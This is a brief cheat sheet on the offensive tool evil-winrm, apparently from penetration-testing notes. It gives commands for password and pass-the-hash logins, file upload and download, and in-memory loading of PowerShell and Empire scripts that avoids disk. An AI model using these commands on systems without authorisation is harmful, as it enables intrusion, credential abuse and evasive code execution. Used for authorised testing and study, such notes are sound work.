### evil-winRM  

To install.  

`sudo gem install evil-winrm`  

To connect with a password.  

`evil-winrm -u USERNAME -p "PASSWORD" -i IP_ADDRESS`  

To connect with a NTLM hash.  

`evil-winrm -u USERNAME -H HASH_PASSWORD -i IP_ADDRESS`  

While in evil-winrm, we can upload and download files.  

`upload LOCAL_FILEPATH REMOTE_FILEPATH`  

`download REMOTE_FILEPATH LOCAL_FILEPATH`  

To upload a directory of scripts to run e.g. powershell scripts we had on our machine at /opt/scripts, this command will upload to memory and not touch the disk. This can be used with empire scripts.   

`evil-winrm -u USERNAME -p "PASSWORD" -i IP_ADDRESS -s /opt/scripts`
